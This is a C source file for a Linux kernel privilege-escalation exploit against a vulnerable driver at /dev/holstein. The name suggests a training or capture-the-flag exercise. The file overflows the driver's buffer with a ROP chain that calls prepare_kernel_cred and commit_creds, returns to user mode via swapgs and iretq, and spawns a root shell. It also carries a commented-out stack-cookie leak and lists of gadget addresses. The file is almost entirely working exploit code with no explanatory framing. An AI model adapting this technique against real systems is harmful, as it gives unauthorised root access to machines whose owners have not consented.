#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define BUFFER_SIZE 0x400

long long user_cs, user_ss, user_rflags, user_sp;

void shell() {
	puts("[+] Spawning shell");
	execve("/bin/sh", NULL, NULL);
}

int main() {
	int fd = open("/dev/holstein", O_RDWR);

	// Leak
	/*
	char buf[0x10000] = {0};
	read(fd, buf, BUFFER_SIZE+8*8);

	for (int i = BUFFER_SIZE/8; i < BUFFER_SIZE/8+8; i++) {
		printf("%p\n", ((long long*)buf)[i]);
	}
	long long cookie = ((long long*)buf)[BUFFER_SIZE/8+3];
	printf("[+] Leaked Cookie: %p\n", cookie);
	*/
	// Save state
	asm(".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("[+] Saved state");

	// Overflow
	char buf_overflow[0x800];
	memset(buf_overflow, 'A', 0x800);
	unsigned int i = 0x400/8;

	//((long long*)buf_overflow)[++i] = 0xffffffff811f61fd; // pop rdi; ret 0;
	((long long*)buf_overflow)[++i] = 0xffffffff81f1f0e9; // pop rdi; ret;
	((long long*)buf_overflow)[++i] = 0x0;
	((long long*)buf_overflow)[++i] = 0xffffffff8106e240; // T prepare_kernel_cred

	((long long*)buf_overflow)[++i] = 0xffffffff81fd47d4; // pop rdx; ret;
	((long long*)buf_overflow)[++i] = 0x0;
	((long long*)buf_overflow)[++i] = 0xffffffff814a2f9c; // mov rcx, rax; mov [rdi+0x570], rax; sub rcx, rdx; add [rdi+0x568], rcx; ret;
														  // cred struct -> RCX


// Sounds useful dunno
/*
0xffffffff81f3623a: mov [rdx], rcx; mov rax, [rax+0x10]; ret;
0xffffffff81f30d45: mov [rcx], rax; ret;
0xffffffff81c94811: pop rax; ret;

// One idea
0xffffffff81cc0206: pop r15; ret;
0xffffffff81f302b5: xchg r12, rax; call r15;
0xffffffff81c94811: pop rax; ret;
0xffffffff81f38979: mov rdi, r12; call rax;

0xffffffff812ac41b: xchg [rcx], esp; pop rbp; xor al, 0; mov r12, [rbp-8]; leave; ret;
0xffffffff81fdc02c: xchg rdi, rax; notrack jmp qword ptr [rax-0x69];
*/

	((long long*)buf_overflow)[++i] = 0xffffffff8106e390; // T commit_creds
	((long long*)buf_overflow)[++i] = 0xffffffff8160bfac; // swapgs; ret;
	((long long*)buf_overflow)[++i] = 0xffffffff81f3eaa6; // iretq;
	((long long*)buf_overflow)[++i] = (long long)shell;
	((long long*)buf_overflow)[++i] = user_cs;
	((long long*)buf_overflow)[++i] = user_rflags;
	((long long*)buf_overflow)[++i] = user_sp;
	((long long*)buf_overflow)[++i] = user_ss;

// 0xffffffff81018dc5: mov rax, rdx; shr rdx, 0x20; and ah, 0xfe; wrmsr; ret;
// 0xffffffff81800f9a: mov rdi, rdx; call rsi;
// 0xffffffff81f15262: mov rdi, rbx; call rax;
// 0xffffffff81f190f9: mov rdi, r15; call rax;
// 0xffffffff812fc124: mov [r8], rax; pop rbp; ret;
// 0xffffffff81307ef1: div rcx; mov r12, rax; mov rax, r12; mov r12, [rbp-8]; leave; ret;
	write(fd, buf_overflow, i*8);

	return 0;
}
